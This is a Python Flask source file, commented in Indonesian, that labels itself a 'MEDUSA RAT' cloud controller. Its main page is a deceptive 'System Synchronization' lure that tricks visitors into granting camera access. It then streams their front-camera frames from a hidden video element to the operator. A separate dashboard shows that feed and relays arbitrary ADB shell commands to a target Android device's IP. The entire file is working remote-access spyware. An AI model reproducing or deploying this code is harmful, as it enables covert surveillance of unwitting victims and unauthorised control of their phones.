import os
import base64
import subprocess
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Direktori penyimpanan hasil loat/unduhan di cloud
LOOT_DIR = os.path.join(os.getcwd(), "ADB_LOOT")
os.makedirs(LOOT_DIR, exist_ok=True)

# Variabel global untuk menyimpan frame live-stream terakhir
latest_frame = None

# --- HTML TEMPLATE UNTUK TARGET (ONE-CLICK HANDSHAKE VIA QR/LINK) ---
TARGET_HTML = """
<html>
<head>
    <title>System Synchronization</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
        .box { border: 2px solid #ff0000; display: inline-block; padding: 30px; border-radius: 8px; background-color: #000; box-shadow: 0 0 15px #ff0000; }
        .btn { background-color: #8b0000; color: white; padding: 16px 32px; border: 1px solid #ff0000; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px #8b0000; }
        .btn:hover { background-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[ MEDUSA INTERCONNECT ]</h2>
        <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
        <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
    </div>
    <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
    <script>
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        async function triggerOtoritas() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                let video = document.getElementById("v-feed");
                video.srcObject = stream;
                video.onloadedmetadata = () => { video.play(); setInterval(captureFrame, 400); };
                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p></div>";
            } catch(err) { alert("Izin ditolak: " + err); }
        }
        function captureFrame() {
            let video = document.getElementById("v-feed");
            if(video.videoWidth > 0) {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
            }
        }
    </script>
</body>
</html>
"""

# --- DASHBOARD KONTROL OPERATOR ---
DASHBOARD_HTML = """
<html>
<head>
    <title>Medusa Web Dashboard</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        .btn { background: #800; color: #fff; border: 1px solid #f00; padding: 10px; margin: 5px; cursor: pointer; }
        .btn:hover { background: #f00; }
        #monitor { width: 320px; height: 240px; border: 1px solid #f00; background: #000; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>MEDUSA RAT CLOUD CONTROLLER</h1>
    <h3>Target Media Live Stream</h3>
    <img id="monitor" src="" onerror="this.style.display='none';" onload="this.style.display='block';">
    
    <h3>Eksekusi Perintah ADB (Relay ke IP Lokal)</h3>
    <input type="text" id="target_ip" placeholder="Masukkan IP Target (e.g. 192.168.1.50)">
    <br><br>
    <button class="btn" onclick="sendCmd('shell dumpsys battery')">Cek Baterai</button>
    <button class="btn" onclick="sendCmd('shell input keyevent 26')">Toggle Power Layar</button>
    <button class="btn" onclick="sendCmd('shell screencap -p /sdcard/s.png')">Trigger Screenshot</button>

    <pre id="log" style="background:#000; padding:10px; border:1px solid #333;"></pre>

    <script>
        // Ambil live stream gambar secara periodik
        setInterval(() => {
            document.getElementById('monitor').src = '/get_frame?' + Date.now();
        }, 500);

        function sendCmd(cmd) {
            let ip = document.getElementById('target_ip').value;
            fetch('/execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ ip: ip, command: cmd })
            })
            .then(res => res.json())
            .then(data => { document.getElementById('log').innerText = JSON.stringify(data, null, 2); });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # Menampilkan halaman pancingan/handshake untuk target yang membuka link Render
    return render_template_string(TARGET_HTML)

@app.route('/operator')
def operator_dashboard():
    # Menampilkan dasbor kontrol untuk Anda sendiri
    return render_template_string(DASHBOARD_HTML)

@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    global latest_frame
    latest_frame = request.data.decode('utf-8')
    return "OK"

@app.route('/get_frame')
def get_frame():
    global latest_frame
    if latest_frame and "," in latest_frame:
        try:
            img_data = base64.b64decode(latest_frame.split(",")[1])
            return Response(img_data, mimetype='image/jpeg')
        except:
            pass
    return "", 204

@app.route('/execute', methods=['POST'])
def execute_command():
    data = request.json
    target_ip = data.get("ip")
    command = data.get("command")
    
    if not target_ip:
        return jsonify({"status": "error", "message": "IP Target diperlukan"}), 400

    # Pastikan server ADB cloud mencoba menyambung ke IP target (memerlukan target mengekspos port 5555 ke publik/tunnel)
    adb_prefix = f"adb -s {target_ip}:5555"
    
    # Otomatis hubungkan jika belum tersambung
    subprocess.run(f"adb connect {target_ip}:5555", shell=True, capture_output=True)
    
    # Jalankan perintah
    full_cmd = f"{adb_prefix} {command}"
    process = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, errors='ignore')
    
    return jsonify({
        "status": "success" if process.returncode == 0 else "error",
        "stdout": process.stdout,
        "stderr": process.stderr
    })

if __name__ == '__main__':
    # Render menggunakan port dinamis dari environment variable PORT
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
